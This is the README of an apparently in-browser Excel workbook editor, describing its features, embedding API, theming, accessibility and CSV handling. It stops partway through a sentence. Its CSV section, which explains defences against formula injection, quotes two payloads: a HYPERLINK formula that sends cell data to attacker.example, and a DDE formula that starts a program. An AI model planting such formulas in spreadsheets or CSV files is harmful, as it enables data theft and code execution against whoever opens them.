# Workbook editor (proof of concept)

Open an Excel workbook in the browser, edit it like a spreadsheet, and save it
back as .xlsx without losing what the editor can't display.

- View any .xlsx or .xlsm: every sheet, number formats, fonts, fills, column
  widths, merged cells, hidden, grouped and frozen rows and columns. As in
  Excel, a sheet runs to column XFD and row 1,048,576: more rows and columns
  appear as it is scrolled towards the last shown, and going to a cell
  beyond them brings them with it.
- Select as in Excel: a column's letter or a row's number selects it whole,
  dragging across them selects several, Shift+click reaches from the active
  one and Ctrl+click (⌘-click on a Mac) adds another, and the corner above
  the row numbers selects the sheet.
- Edit cells, paste from Excel or Google Sheets, copy and paste within the
  workbook (formulas move their references like Excel), drag to fill, clear,
  undo and redo. Pasting from Excel or Google Sheets brings the cells'
  formats too (bold, colours, borders, alignment, number formats). Paste
  special pastes only the values, the formulas or the formats of cells
  copied in the workbook, or pastes them transposed.
- Fill as in Excel. Dragging the fill handle continues numbers, dates,
  quarters, "Item 1" → "Item 2", and lists: day and month names, short and
  full, in the editor's language as well as English (Montag, Mo., Januar and
  Jan. in German), the host's `customLists`, and the user's own. A list
  continues from any of its entries, whatever its case, in the case the cell
  is written in (MON → TUE, mon → tue). "Fill series…" in the cell menu is
  Excel's Fill Series dialog for the selection: in rows or columns (as the
  selection's shape suggests), Linear, Growth, Date (by day, weekday, month
  or year) or AutoFill, with a step and stop value read in the user's
  locale, or a least-squares trend fitted to the numbers each row or column
  starts with, which replaces them, as Excel's does. Each row or column
  starts from its first cell, and one that starts with nothing (or, but for
  AutoFill, with text) is left as it is; a series ends before passing the
  stop value, leaving the cells after it; with one cell selected it runs on
  until it gets there; and dates follow the workbook's date system, 1904
  included. Its "Custom lists…" button adds, changes and deletes the user's
  lists, which are kept in the browser for each `user` (and last until the
  page closes where the browser keeps nothing). Fill down and fill right are
  in the cell menu too. Filling is one step to undo, and leaves a protected
  sheet's locked cells and a schema's read-only cells as they were, saying
  how many.
- Format cells from the format bar: font and size, bold, italic, underline
  and strikethrough, font and fill colours, borders, alignment and wrapping,
  number formats (with more or fewer decimals), and clearing formats. Each
  change makes only the formats it needs, keeping everything else about the
  cell's format, and is undone in one step. Hosts can turn the bar off with
  `features.format`.
- Change the layout and save it: column widths and row heights (drag a
  column's or row's edge, double-click it to fit the widest value in the
  column or the tallest cell in the row as Excel's AutoFit does, or set them
  from the menu, which has AutoFit too), hide and unhide rows
  and columns, freeze panes, merge and unmerge cells. Merging asks first when
  it would clear values, as Excel does.
- Outlines, as in Excel: a sheet with grouped rows or columns gets outline
  bars beside the row numbers and above the column letters, kept in line
  with the grid as it scrolls and with frozen panes. Each group's − or +
  collapses or expands it, and the numbered buttons show the outline to that
  level. Alt+Shift+Right and Left (⌥⇧→ and ⌥⇧← on a Mac) group and ungroup
  the selected rows or columns, asking which for a range of cells, and the
  cell menu's Rows and Columns also hide or show the detail of the group at
  the active cell, show a level, and clear the outline. Groups go seven
  levels deep, follow their rows and columns as others are inserted and
  deleted (rows and columns inserted inside a group join it), each change is
  a step to undo, and the outline is saved as Excel saves it, with summary
  rows below or above and summary columns right or left as the file has
  them. On a protected sheet, rows or columns can be grouped, hidden and
  shown only where its protection lets them be formatted, as in Excel.
- Defined names, as in Excel: type one in the name box to go to its range
  (the box lists the names, with what each refers to, as you type, and
  shows the name of a selection that is exactly a named range), or type a
  new one to name the selection. A name or reference on a hidden sheet
  isn't gone to, as in Excel; the editor says the sheet is hidden.
  "Define name…" and "Name manager…" in the cell menu define, edit, filter
  and delete them, for the workbook or one sheet, with a comment. Formulas
  that use a name recalculate when it changes, renaming one renames it in
  the formulas and names that use it, and deleting one leaves #NAME?. Each
  change is a step to undo, is listed in the Changes panel, and is saved.
- Formulas recalculate live as you edit, with the editor's own engine (about 475 of Excel's functions, checked against Excel's answers).
  Formulas it can't calculate keep Excel's saved value and are marked; when
  their inputs change they are marked stale, and Excel recalculates them on
  open.
- Dynamic arrays, as in Excel 365: a formula whose result is an array
  (SORT, UNIQUE, FILTER, SEQUENCE, TAKE and the other array functions, or a
  range such as `=B2:B9*2`) spills its values into the cells below and to
  the right. Those cells hold nothing of their own: the formula bar shows
  the formula greyed, and the range is outlined in blue while one of its
  cells is selected. Results grow and shrink as their inputs change, taking
  just the room they need. Typing into a spilled cell, or anything else in
  the way, makes the formula show #SPILL! (the range it needs outlined
  dashed), and clearing it, or undoing, spills it again. The file's own
  dynamic arrays calculate the same way, and their cells can be typed over.
  Array formulas entered with Ctrl+Shift+Enter calculate too, filling the
  range they were entered in as Excel does (a single row or column repeated
  across it, #N/A past the result), show `{=formula}` in each of their cells
  and stay locked, as Excel won't change part of one. Spilled cells copy, paste and fill as their values (a whole spill
  copies as its formula, which spills again where it is pasted), sorting
  refuses to move part of a spill, as Excel does, rows and columns can be
  inserted and deleted through one, and the Changes panel, schema checks and
  a host's readers see spilled values as values. A spill is saved as Excel
  writes it: the formula with the range it spills into, and the values in
  the cells it covers.
- Typing a formula, in the formula bar or in a cell, works as in Excel: the
  functions whose names start with what was typed are offered (arrow keys
  choose, Tab or Enter inserts, Escape closes; those the editor leaves for
  Excel to calculate are marked), the arguments of the function the caret is
  in are shown with the current one in bold, each reference is coloured and
  outlined on the sheet in the same colour, and F4 switches the reference at
  the caret between A1, $A$1, A$1 and $A1. The list of functions is
  `src/core/functionCatalog.ts`, checked against the engine by its tests.
- Save writes only the cells, notes and comments that changed back into the
  original file. Charts, pivot tables, macros, conditional formatting,
  validation, pictures, sparklines and everything else stay byte-for-byte as
  they were.
- Charts are drawn where they sit (and chart sheets fill their sheet) from
  the cells as they are now, so editing their data redraws them: column and
  bar charts (clustered, stacked and 100% stacked), line, area, pie,
  doughnut and scatter charts, and columns, lines and areas combined, on
  two axes if need be. Other kinds show as placeholders. Screen readers
  hear each chart's name and its series and values.
- Notes and threaded comments are marked in the corner of their cell and
  shown when you point at the cell or select it. From the cell menu, or with
  Shift+F2 as in Excel, you can add, edit and delete a note, and read a
  comment thread, reply, edit or delete your own comments, resolve or reopen
  it, delete it or start a new one. They are saved as Excel writes them,
  with the note Excel keeps for each thread for its older versions. A
  protected sheet keeps its notes and comments unless its protection allows
  editing objects, as in Excel, and a schema's read-only cells keep theirs.
- Hyperlinks, the workbook's own and those of HYPERLINK formulas, are drawn
  as links (unless the cell's font has a colour of its own), show where they
  go when pointed at and in the formula bar, and are followed with Ctrl+click
  or Ctrl+Enter (⌘ on a Mac) or from the cell menu: to a place in the
  workbook, or to a web page or email in a new tab after asking. The cell
  menu inserts, edits and removes them, undoably, giving cells Excel's
  Hyperlink look and taking it away as Excel does, and saves them as Excel
  does. Clearing a cell keeps its link, as Excel's Clear Contents does;
  copying, sorting and moving cells takes their links with them.
- "What's in this file" lists everything the editor keeps but can't show,
  and the editor asks before any edit would replace a formula with a value.
- Excel's own data validation is enforced. List rules get a dropdown,
  whether the list is typed into the rule, a range on any sheet, a named
  range, or a formula such as `OFFSET(…,COUNTA(…))` or a dependent
  `INDIRECT(C2)`; lists are read live, so editing the source updates the
  dropdown. Whole number, decimal, date, time, text-length and custom-formula
  rules check typed values, with bounds that may themselves be formulas or
  cells. Failures raise the rule's stop, warning or information alert, and
  the formula bar shows the rule or its input message. Pasted values and
  formulas aren't checked, as in Excel.
- Add, rename, delete, move, hide and unhide sheets from each sheet tab's
  menu (right-click, Shift+F10 on the tab, or the ⋯ after the tabs on a touch
  screen), the + after the tabs, or by dragging a tab, with Excel's rules for
  names and the same refusals (the last visible sheet stays; a protected
  workbook structure changes nothing). Formulas on every sheet, names, charts, validation, conditional formatting,
  table formulas, pivot sources and links within the workbook follow a
  renamed sheet; references to a deleted one become #REF!, and its drawings,
  charts, notes, tables and pivot tables go with it. Each change can be undone.
- Right-click a cell or heading to cut, copy and paste, insert or delete rows
  and columns, sort, filter by values, or find and replace (⌘F / Ctrl+F),
  with Excel's wildcards: * for any run of characters, ? for any one, and ~
  before either to mean it literally.
  Cutting and pasting moves cells, and references to them follow. Rows
  inserted into an Excel table, or typed or pasted just below one without a
  totals row, become part of it with its calculated columns and formats.
- Optional **schemas** describe the workbooks a consumer expects. A workbook
  that matches one is validated and constrained by it; one that matches none
  opens as a plain spreadsheet with a warning. Schemas can be written in
  TypeScript (with async checks and business logic), generated from a
  workbook, edited in the schema designer, and exported or imported as JSON.
- Number handling a host or schema can tighten: show and copy every stored
  digit instead of the rounded format, ask before pasting values that would
  be stored differently from how they read (day/month-ambiguous dates, more
  than 15 significant digits, leading zeros), and list every changed cell
  for review before saving.
- Dates and decimals are read in the user's locale (`3/4/2026` is 3 April in
  the UK, `1.234,5` is 1234.5 in Germany).
- CSV files (.csv, and tab-separated .tsv and .txt) open as a workbook of one
  sheet, which saves as .xlsx, and the sheet shown downloads as CSV; see
  [CSV files](#csv-files).
- A Changes panel lists every cell that differs from the opened file, old and
  new value, every note or comment thread changed, and a timestamped history
  of actions. Unsaved edits are kept in
  the browser and offered back if the same file is reopened after a crash or
  a closed tab.

Everything runs in the browser; the file never leaves the machine.

## Running it

```bash
npm install
npm run samples   # rebuilds the samples in public/samples, including the 100k-row big.xlsx
npm run dev
```

`npm run build:lib` builds the embeddable library; with the dev server
running, http://localhost:5173/examples/html/ shows it in a plain page.

Then open http://localhost:5173 and pick a sample or drop in a workbook.

http://localhost:5173/embedded.html is the editor embedded in a host app
(`src/embedded`): a procurement portal where suppliers submit price lists.
A supplier uploads a workbook (or tries the sample, which has one problem of
each kind) and corrects it in the editor under the portal's brand and
language. Three kinds of check run: each column's type and limits, the Excel
validation rules the template carries, and the portal's business checks,
which call its (simulated, local) services. Products must be in the
catalogue, prices more than 15% from the last approved price are flagged,
and a list uses one currency. "Download a copy" exports at any point;
"Submit price list" hands the portal the file and its values, which it reads
into its own records (`parse.ts`) and shows as a summary, a breakdown by
category and the change from approved prices. Approving a list makes its
prices the ones the next list is checked against. Submissions are kept in
the browser's IndexedDB; nothing is sent anywhere.

`npm test` runs the unit tests (reading, recalculation, editing, saving and
reopening the samples, schemas, the store and translation);
`npm run test:coverage` does the same and fails if coverage of the code
behind the screens drops below 98% of lines (it is at about 99%). The screens
themselves are covered by the browser tests. `npm run e2e` runs the browser tests with Playwright
against a production build: editing, saving, schemas, the HTML host page,
keyboard-only use, and an axe accessibility scan of every screen, menu and
dialog in the light and dark themes (run `npx playwright install chromium`
once first). With `E2E_BROWSERS=all` they run in Firefox and WebKit (Safari's
engine) as well, after `npx playwright install firefox webkit`; the phone
tests run in WebKit but not Firefox, which can't emulate a phone. The
tests start their own servers, on ports 4173 to 4176, and stop when one is
taken; `E2E_PORT=5273` moves them all.
`npm run lint` runs Oxlint, with React's hooks rules and accessibility
checks on the screens (`.oxlintrc.json`). `npm run check:bundle`, after the
builds, holds each bundle to a size budget and fails if the calculation
engine ends up in code the page loads rather than in the worker.
`npm run test:perf` times opening, calculating, editing and saving the
1.1 million cell `big.xlsx` (made by `npm run samples`) against budgets.
`npm run engine:bench` compares the calculation engines headless, on the
samples and the test corpus: opening, building and calculating, a typical
edit, the heap each adds, how their results compare with the values Excel
saved, and (after a build) each one's download size.
`.github/workflows/ci.yml` runs all of these, the builds, the browser tests
in Chromium, Firefox and WebKit, and the round-trip check on the samples. `public/samples/kitchen-sink.xlsx` and
`public/samples/formatting.xlsx` are committed; they are generated by
`scripts/gen_kitchen_sink.py` and `scripts/gen_formatting.py` with XlsxWriter
if you need to rebuild them.

## Embedding the editor

The editor is a component; the demo app in `src/demo` is one consumer of it.
`npm run build:lib` builds two library flavours into `dist-lib/`:

- `dist-lib/react`: the React component, with React 18 or 19 as a peer
  dependency.
- `dist-lib/standalone`: React, the worker and the styles bundled, plus a
  `<workbook-editor>` custom element, for hosts without React.

React:

```tsx
import { createWorkbookEditor, WorkbookEditor } from 'workbook-editor';
import 'workbook-editor/style.css';

const editor = createWorkbookEditor({ schemas, onSave: (file) => upload(file.bytes) });
<WorkbookEditor editor={editor} />;
// Later: editor.destroy() stops its worker.
```

Every host controls the editor through the same handle (`EditorHandle`):

- `open(bytes, fileName)` resolves `true` once the workbook is open, `false`
  when the user chose to keep the unsaved workbook already open, and rejects
  with the reason when the file can't be opened. The caller's bytes are
  copied, not taken.
- `save()` runs the Save button's flow and resolves with what happened:
  `'saved'`, `'downloaded'`, `'cancelled'`, `'blocked'` or `'failed'`.
- `downloadCopy()`, `getWorkbook()` (the workbook as a save would hand it
  over, without the checks), `downloadCsv()` and `getCsv()` (the sheet shown
  as CSV, see [CSV files](#csv-files)), `goTo(ref)` (a cell, a range or a defined name), `registerSchema`,
  `removeSchema`, `setTheme`, `setLanguage`, `setUser` and `setCustomLists`.
- `status`, `fileName`, `editedCount` and `unsaved`, with `subscribe(listener)`
  to hear when they change, and `destroy()`.

The workbook lives in a web worker, which the component starts with
`new Worker(new URL('./assets/workbook.worker.js', import.meta.url))`. Vite,
webpack 5 and Parcel see that and bundle the worker with the host app. With
a bundler that doesn't, serve `workbook-editor/worker` (the file
`dist-lib/react/assets/workbook.worker.js`) yourself and pass
`createWorker: () => new Worker(url, { type: 'module' })`.
`E2E_HOST_APP=1 npx playwright test e2e/package.spec.ts` (after `npm run
build:lib`) installs the packed library into a fresh Vite React app under
`/app/` and uses it.

Any other host:

```ts
import { mountWorkbookEditor } from 'workbook-editor/standalone';

const editor = mountWorkbookEditor(element, { schemas, features: { open: false } });
await editor.open(bytes, 'report.xlsx');
```

Or the element (see `examples/html/index.html`), which has the handle's
methods and properties:

```html
<workbook-editor src="/files/report.xlsx" save-handler="event"></workbook-editor>
```

It fires `ready` once it can take a workbook, `opened` (with the file name)
when one has opened, `change` as the edit count changes, `save` with the
saved workbook when `save-handler="event"`, and `editorerror` (with a
message) when the workbook from `src` can't be loaded or opened, or the
editor stops working. Moving the element elsewhere in the page keeps the
editor as it is; changing its theme, language, user, schemas or custom
lists through `options` applies them without closing the workbook.

In Angular (see `examples/angular`, a working Angular 22 app), the element
is used like any custom element: allow it with `CUSTOM_ELEMENTS_SCHEMA`,
bind its options, and listen to its events. Loading the editor with a
dynamic `import()` keeps it out of Angular's initial bundle; the element
keeps options Angular set before it loaded. The standalone build has type
declarations, including `WorkbookEditorElement` for the element itself.

```ts
const editorLoaded = import('workbook-editor/standalone');

@Component({
  schemas: [CUSTOM_ELEMENTS_SCHEMA],
  template: `<workbook-editor save-handler="event" [options]="options" (save)="onSave($event)"></workbook-editor>`,
})
export class Review {
  options: EditorOptions = { schemas: [forecastSchema], saveLabel: 'Save to the app' };
  onSave(event: Event) {
    const saved = (event as CustomEvent<SaveEventDetail>).detail;
    saved.waitUntil(this.api.upload(saved.bytes, saved.values));
  }
}
```

To run it: `npm run build:lib`, then in `examples/angular`, `npm install` and
`npm start` (Angular's CLI needs Node 22.22.3 or later; the folder's
`.node-version` asks for it). `E2E_ANGULAR=1 npx playwright test
e2e/angular.spec.ts` tests it.

Options include `schemas`, `numbers`, `onSave`, `saveLabel`, `features` (hide
the open, save, download or schema buttons when the host provides them), `user` (recorded in the
history, and the author of new notes and comments), `customLists` (lists that filling continues,
such as `[['North', 'East', 'South', 'West']]`, after the built-in day and month names and before
the user's own), `drafts`, `warnOnUnload`, `locale`, `limits`, `macros`, `recalc`,
`engine` and `diagnostics` (below), `links`, `onLinkClick`, `onError`, `workerTimeout`, `createWorker` and `csvExport`. All styles are scoped under `.wbe`,
and every class the editor uses starts `wbe-`, so a host's own `.btn`,
`.modal` or `.active` rules don't reach into it. Cell editors open in an
element with id `wbe-portal` that the editor adds to the page.

`features` turns parts of the editor on and off; each is on unless set to
`false`:

| Feature | What it is |
| --- | --- |
| `open` | The Open button, the file picker and dropping a file on the editor |
| `save` | The Save button and ⌘S / Ctrl+S |
| `download` | With `onSave`, a separate button to download a copy |
| `schemas` | The schema designer's button |
| `report` | "What's in this file" and the banner that sums it up |
| `charts` | Charts drawn from the workbook's current values. Off, they show as placeholders with their title, and the chart library (Chart.js, about 70 kB gzipped) is never loaded; on, it loads only when a workbook has a chart to draw |
| `format` | The format bar, for fonts, colours, borders, alignment and number formats; hosts whose users only fill in values can leave it out |
| `csv` | CSV files (.csv, .tsv and .txt) in the Open button and when dropped, and the button that downloads the sheet shown as CSV (shown when `download` is on too) |

`onEvent` hears what the editor does, for a host's logging or analytics:
`opened` (with how long it took), `openFailed`, `calculated` (how many
formulas stay up to date), `saved` (what came of it, and how long it took)
and `error` (each error shown to the user, which also stays on screen until
dismissed). Messages are in English whatever the editor's language.

If the worker can't load, crashes, runs out of memory or spends longer than
`workerTimeout` (default two minutes) on one task, the editor stops it, calls
`onError` (the element fires `editorerror`) and offers to reopen the file,
bringing back unsaved edits from the draft. If building the calculation
engine is what failed, the file reopens with live recalculation off.

Opened files are treated as untrusted. Before anything is decompressed the
editor checks the file size (default limit 50 MB), the total unzipped size
(500 MB), the compression ratio of large parts (zip bombs) and the part
count; while reading, the cell count (2 million). The defaults suit a
browser tab on a phone; `limits` raises them. Parts cut off mid-tag, and
row or column numbers beyond Excel's, are refused as a damaged file; formulas
over very large ranges or arrays keep Excel's saved values rather than being
calculated. Macros are VBA projects and Excel 4.0 macro sheets:
`macros: 'remove'` strips the VBA project and empties macro sheets (dropping
the Auto_Open names that run them) on save, and saves as .xlsx;
`macros: 'block'` refuses workbooks with either. ActiveX controls and
embedded objects are reported, and `activeContent: 'block'` refuses
workbooks with them. Links to other workbooks are kept but never fetched.
The editor is not a file sanitiser: whatever it doesn't remove stays in the
saved file, as the "What's in this file" panel lists.

Hyperlinks come from the workbook too, so following one is guarded. A link
to a place in the workbook (a sheet's cells, or a defined name) goes there.
A link elsewhere is opened only if it is a web page (http or https) or an
email (mailto), read as the browser reads it, so tabs, line breaks or
control characters can't hide another scheme: javascript:, data:, file:,
UNC paths, other workbooks and everything else are refused, saying so.
Before opening a web page or email the first time, the editor shows its
full address (international domains in the form that shows lookalike
letters) and asks; it opens in a new tab with `noopener,noreferrer`, so the
page can't reach back into the editor. `links: 'off'` shows and edits links
but never follows them. `onLinkClick(link)` is called with the address
(`url`), its `kind` (`'web'` or `'email'`), and the `sheet` and `ref` of the
cell, instead of the editor asking and opening it; return `true` for the
editor to carry on and do so. Links refused as unsafe never reach it.

Large workbooks: above 200,000 formulas or 2 million cells, live
recalculation starts off (`recalc: 'auto'`, the default). Formulas then show
the values Excel saved and Excel recalculates on open; a banner says so, and
it and the status bar offer to turn it on. On the 1.1-million-cell sample that is 1 second and about
200 MB to open, against 5.5 seconds and 750 MB with the engine. `recalc:
'on'` or `'off'` forces it either way. The engine only takes the sheets that
formulas use, adding others when a formula first names them, and sheet XML
is decoded again when saving rather than kept in memory.

The calculation engine: the session works formulas out through one
interface (`FormulaEngine` in `src/core/engine.ts`), which the engine in
`src/engine` implements and tests can stand in for. The engine is a chunk of
the worker's own, downloaded when a workbook is first opened; the library
builds inline it, keeping one worker file. With `diagnostics: true` the
status bar says what the engine took to download and how long opening,
calculating and the last edit took, with the worker's heap where the browser
reports it (Chrome). The demo turns this on.

The engine reads formulas with the parser the editor already uses, compiles each distinct formula once (in
its relative R1C1 form, so a column of copied formulas shares one), and
recalculates only what an edit affects. It has every function the editor
offers, dynamic arrays and spills, array formulas entered with
Ctrl+Shift+Enter, `A2#` and `@`, 3-D references and unions, defined names,
LAMBDA (written in place, in LET or as a name) and Excel's rules for
comparing and converting values. CELL gives what the cell itself holds
(address, row, column, contents, type); asked for a format, width or
protection, it keeps Excel's saved value, as any formula the engine can't
calculate does. It is 39 kB gzipped. It replaced HyperFormula, which was
173 kB: the library's worker went from 297 kB to 156 kB, and on `big.xlsx`
the engine calculates in about a third of the time with about half the
memory. `npm run engine:bench` measures it on the samples and the test
corpus.

Its answers are held to Excel's: `npm run excel:check` writes a workbook per
family of functions to `tests/excel-checks/`, each formula beside the
engine's answer and a cell Excel fills on opening with whether they agree.
The answers Excel agreed with are kept as `<family>.json`, which
`tests/excel-checks.test.ts` holds the engine to.

**Saving to the host.** Edits are kept locally as a draft until saved; with
`onSave` (or the element's `save-handler="event"`), the Save button (labelled
by `saveLabel`) runs the schema checks and hands the host the saved workbook:

- `bytes` and `fileName`: the .xlsx, ready to upload or store;
- `values`: when a schema applies, its tables' records keyed by field and its
  single cells, as plain JSON (dates as ISO text), with `schema` naming the
  schema, its version and the errors and warnings it found;
- `cell(sheet, ref)` and `range(sheet, ref?)`: any value, for hosts without a schema;
- `changes` (each change, before and after) and `history`;
- `outOfDate`: formulas whose value may be stale because they use something
  the editor can't calculate and a cell they depend on changed (Excel
  recalculates them on opening). Save asks before saving any.

The host can keep the file, the values or both. A separate Download button
exports a copy without saving it to the host, and leaving the page warns only
about changes the host hasn't received. Without `onSave`, Save downloads the
file. If the stored copy changed since it was opened, throw
`SaveConflictError`: the editor keeps the user's work and offers it as a
download. `examples/html/index.html` shows what arrives.

### Theming

Every colour, font, type size, corner radius, shadow and icon can be
replaced; layout can't. The look comes from `--wbe-*` custom properties on
the editor's root, declared with their defaults at the top of
`src/editor/editor.css`. That includes the grid, which is drawn on a canvas
and reads its `--wbe-grid-*` properties when it renders. Set them in CSS:

```css
.wbe {
  --wbe-accent: #0b5cad;
  --wbe-font: Georgia, serif;
  --wbe-grid-selection: #0b5cad;
}
```

or through the `theme` option, where each token is the property's name in
camelCase (`gridHeaderBg` sets `--wbe-grid-header-bg`), and change it later
with `setTheme(theme)` on the store, the mount handle or the element. The
`EditorTheme` type lists every token. A dark theme sets `colorScheme: 'dark'`
along with the surfaces and the grid's colours. Text and borders the workbook
leaves in Excel's automatic colour follow `gridText` and `gridBorderAuto`, so
they stay readable; on cells the file fills, automatic text uses
`gridTextOnFill`, which stays dark because the fills are light. Colours the
workbook sets itself are kept.

References in a formula being typed take `formulaRef1` to `formulaRef7`
(`--wbe-formula-ref1`…) in turn, as text on the field's background and as
outlines on the grid; a dark theme sets lighter ones.

Charts take the grid's background, text, lines and font. Their series keep
the colours the file gives them; series it leaves to Excel get the workbook
theme's accent colours, as in Excel, or the colours in `chartColors`
(`--wbe-chart-colors`, space-separated) when a theme sets it.

Icons are replaced by name with `icons: { download: 'M12 3v12…' }` (SVG path
data on a 24×24 grid, drawn in the current text colour), or with any element
from React; `--wbe-icon-stroke-width` sets the line weight. React hosts can put
their own controls at the end of the toolbar with `toolbarEnd`. Drop-down
lists are the browser's own, with the theme's `chevronDown` icon for their
arrow. The toolbar folds its labels into icons, a step at a time, only as
far as it must to fit, and then wraps onto a second row: it measures what
it needs in the theme's font and the language, so larger type, longer
labels or a host's controls never cut a button off.

The demo's theme picker (`src/demo/themes.ts`) shows themes built this way,
each showing something different: Indigo, a product's own colour through
the toolbar, grid and charts, with rounder corners; Paper, a warm, flat look
with a cream grid, square corners and outlines for shadows; Dark; and High
contrast, for low vision, with black text, strong lines, bolder headings,
larger type and heavier icons.

### Languages

Every word the editor shows comes from a message catalogue, with i18next
and react-i18next. English and German are built in; `language` picks one
(it defaults to `locale`, and "de-CH" falls back to German, anything unknown
to English), and `setLanguage()` on the store, mount handle or element
changes it while the editor is open. Each editor has its own i18next
instance, so a host that uses i18next for its own pages keeps its setup.

Other languages, or different wording, come in as `translations`, keyed by
language, in i18next's JSON format: `{{name}}` placeholders,
`{{count, number}}`, and plural keys with the forms the language needs
(`rows_one`, `rows_few`, `rows_many`, `rows_other` for Polish). Start from the
exported `en` catalogue:

```ts
createWorkbookEditor({
  language: 'fr',
  translations: { fr: { 'toolbar.open': 'Ouvrir', /* … */ }, en: { 'toolbar.saveAsExcel': 'Export' } },
});
```

Numbers and dates in the editor's own text follow the language; reading
typed numbers and dates follows `locale`. Right-to-left languages mirror the
editor around the grid, which stays left to right as Excel's sheets do.

What the workbook says is shown as written: sheet names, values, and the
messages its author gave Excel's data validation. Text the host writes in a
schema (its name and description, field descriptions, rule and hook
messages) can be given in several languages, `{ en: 'Price', de: 'Preis' }`,
and hooks are told the editor's language. Messages from the worker reach
the editor as keys rather than sentences, so changing language changes
everything on screen. The round-trip checker answers in English.

### Keyboard and screen readers

Everything works without a mouse. In the grid, the keys are Excel's: arrows
and Tab move, typing replaces a cell, Enter edits it, Shift+Space selects
the selection's whole rows, Ctrl+Space its whole columns and Ctrl+A (⌘A)
the whole sheet, and Shift+F10 (or the
menu key) opens the cell menu with fill down and right, and Fill Series
(whose options are radio buttons and fields, with the Custom Lists dialog
behind a button); notes and comments; rows and columns (insert, delete,
height or width, AutoFit, hide and unhide, group and ungroup, and their groups'
detail and levels); merging; freezing panes; sort and filter; and opening,
inserting, editing and removing links. Its submenus open with the right
arrow, Enter or Space, and close with the left arrow or Escape. Shift+F2
opens the cell's note or comments, Ctrl+Enter (⌘Enter on a Mac) follows its
link, and Alt+Shift+Right and Left group and ungroup the selected rows or
columns. The outline bars' buttons say which rows or columns they collapse
or expand ("Collapse rows 3 to 8"), and whether their group is expanded; a
click on one leaves the focus in the grid. F6 (Ctrl+F6 where the browser keeps F6) moves
between the toolbar, format bar, formula bar, sheet, side panel and sheet tabs, since Tab
stays in the grid as it does in Excel; typing a cell such as B4, or a
name, in the formula bar's name box goes there, and Alt+Down lists the
workbook's names. The sheet tabs are one stop: the arrow
keys, Home and End move between them, and Enter shows a sheet; on a tab,
Alt+Shift+Left and Right move its sheet, F2 renames it, and Shift+F10 (or
the menu key) opens its menu. The + after the tabs adds a sheet, and the
"N hidden" note after it offers the hidden ones back. Ctrl+/ (⌘/ on
a Mac) lists every shortcut. Dialogs keep the focus inside, close with Escape
and hand the focus back, in Safari too, which doesn't focus a clicked button.

The editor takes a browser shortcut only for the same job: Ctrl+S saves,
Ctrl+F finds, Ctrl+Z undoes, and Ctrl+G finds the next match while its find
panel is open. It never repurposes one, so Ctrl+R still reloads the page and
Ctrl+D still bookmarks it (Excel's fill down and fill right are in the cell
menu instead), and on a Mac ⌘Y is left to the browser's history (redo is
⇧⌘Z).

On a phone the editor keeps the grid in view: the toolbar's actions scroll
sideways in one row, the side panel opens over the sheet when asked for
(going to a problem closes it and shows the cell), a cell's note or problem
appears under the formula bar since nothing hovers on touch, and the ⋯ button
there opens the cell menu, as there is no right-click. A tap selects a cell
and a second tap edits it; the formula bar edits it too.

Screen readers hear each cell by its reference and as it is shown (the
value, not the formula, which the formula bar has), then what the grid only
marks in colour: a merge, a formula and whether its value is out of date or
Excel's, the formula a spilled value comes from, a change, a list, a note
or comments, where a link goes, and any schema problem, e.g. "D3, twelve,
changed, error: Expected a number.", "B5, 12, spilled from A5" or "A1,
Prices, link to https://example.com". Rows and columns are numbered as
the sheet numbers them, past hidden ones and below frozen ones. What an
action did is said too: undoing and redoing ("Undone: Sort A to Z"),
inserting and deleting, how many rows a filter hides, opening a file, and
what is wrong with a value just typed. Messages are said once as they
arrive, errors at once; they stay while the pointer or focus is on them,
and warnings stay twice as long as news. A question about something that
can't be undone starts on its Cancel button. Buttons that become
unavailable keep the focus, and closing a panel, banner or message hands it
back to the sheet. The default and demo themes meet WCAG 2.2 AA contrast,
focus stays visible in Windows' forced colours, and the busy spinner slows
for people who ask for less motion.

## CSV files

The Open button, dropping a file, `open(bytes, fileName)` and the element's
`src` all take `.csv`, `.tsv` and `.txt` files. One opens as a workbook of a
single sheet named after the file, read the way Excel reads a CSV file in
the user's `locale`:

- The encoding comes from a byte order mark (UTF-8, or UTF-16 either way
  round); without one, the file is read as UTF-8 if it is valid UTF-8 and as
  Windows-1252 otherwise.
- The delimiter is the one Excel's `sep=;` first line names, if there is
  one; a tab for `.tsv`; otherwise whichever of tab, semicolon and comma
  splits the first hundred records most consistently. When more than one
  fits equally well the locale's list separator wins (Excel always uses the
  list separator, a semicolon where decimals are written with a comma).
- Fields follow RFC 4180: quoted fields can hold delimiters, doubled quotes
  and line breaks; lines can end CRLF, LF or CR; empty lines are empty rows.
- Values are read like typed input: numbers, percentages, currencies, dates,
  times, TRUE and FALSE and error values, with the number format they imply.
  As in Excel, `007` becomes 7 and digits past the fifteenth are lost, so
  codes with leading zeros and long IDs don't survive a CSV file.
- **Unlike Excel, nothing becomes a formula.** A field starting with `=`
  stays text, as do fields starting with `+`, `-` or `@` that aren't
  numbers: a CSV file is data from elsewhere, and cells that run when the
  file is opened are a known way to attack people. A leading apostrophe is
  kept as part of the text, as Excel keeps it in a CSV file.
- The limits for workbooks apply: the file's size (`maxFileBytes`) and its
  number of values (`maxCells`). More rows or columns than a sheet has, or a
  value longer than a cell's 32,767 characters (usually a quote that is never
  closed), are refused with a message saying so, where Excel would open part
  of the file.

Saving writes .xlsx, named after the CSV file (`prices.csv` saves as
`prices.xlsx`). Editing, drafts, schemas and checks work as for any workbook.
`features: { csv: false }` stops the Open button and dropping from taking CSV
files; `open()` still does.

The toolbar's CSV button, `downloadCsv(options)` and `getCsv(options)` write
the sheet shown, and only that sheet, as Excel's "CSV UTF-8" does: each
cell as its number format shows it, with the locale's decimal and thousands
separators; formulas as their results; from A1 to the last row and column
holding a value, hidden and filtered rows included; quoted where needed;
CRLF line ends; and in the download, UTF-8 with a byte order mark (`getCsv`
returns the text without one). The delimiter is the locale's list separator, as Excel's is: a comma, or a
semicolon where decimals are written with a comma, and in Switzerland.
`delimiter` (`','`, `';'` or `'\t'`) overrides it, per call or for the
button through the `csvExport` option. Downloading CSV is an export: it
doesn't count as saving.

### Formulas in CSV files

A CSV file holds no formulas, but spreadsheet apps run any value in one that
looks like a formula when they open it. If a sheet's text came from someone
else (a supplier's upload, a web form), a CSV made from it can carry
`=HYPERLINK("https://attacker.example/?"&A1, "Details")`, which sends other
cells to that site when clicked, or, on older or carelessly configured
Excel, `=cmd|' /C calc'!A0`, which starts a program. Whoever opens the file
is the one attacked.

So the CSV the editor writes puts an apostrophe in front of every value that
starts with `=`, `+`, `-`, `@`, a tab or a carriage return (or the
full-width `＝`, `＋`, `－`, `＠`), as OWASP recommends; spreadsheet apps then
